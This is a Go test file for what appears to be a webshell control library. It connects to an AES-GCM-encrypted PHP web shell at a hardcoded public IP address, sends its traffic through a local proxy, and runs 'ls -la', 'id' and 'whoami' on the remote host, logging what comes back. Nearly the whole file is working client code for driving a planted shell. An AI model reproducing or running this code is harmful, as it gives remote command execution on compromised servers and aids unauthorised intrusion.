//go:build manual

package core_test

import (
	"context"
	"testing"
	"time"

	phpshell "github.com/Yliken/redbeanshellcore/adapter/php"
	"github.com/Yliken/redbeanshellcore/core"
	"github.com/Yliken/redbeanshellcore/crypto/aesgcm"
	"github.com/Yliken/redbeanshellcore/transport/httpform"
)

const (
	shellURL  = "http://39.98.171.213:8080/shell_aes_gcm.php"
	proxyHost = "127.0.0.1"
	proxyPort = 8080
)

var aesKey = []byte("0123456789abcdef0123456789abcdef")

func TestFullPayloadWithRealAdapter(t *testing.T) {
	cr, _ := aesgcm.New(aesKey)

	tr := httpform.NewWithOptions(shellURL, httpform.Options{
		Timeout: 15 * time.Second,
		ProxyChain: []httpform.ProxyConfig{
			{Type: httpform.ProxyHTTP, Host: proxyHost, Port: proxyPort},
		},
	})

	client := core.NewClient(
		core.WithSession(&core.Session{
			NodeID: "e2e", Endpoint: shellURL, Adapter: "php",
			Metadata: map[string]string{"payload_form_field": "passwd"},
		}),
		core.WithTransport(tr),
		core.WithCrypto(cr),
	)

	ops := []core.Operation{
		phpshell.NewPhpExec("ls -la"),
		phpshell.NewPhpExec("id"),
		phpshell.NewPhpExec("whoami"),
	}

	for _, op := range ops {
		r, err := client.Do(context.Background(), op)
		if err != nil {
			t.Fatalf("[%s] failed: %v", op.Name(), err)
		}
		t.Logf("[%s] %s", op.Name(), string(r.Raw()))
	}
}
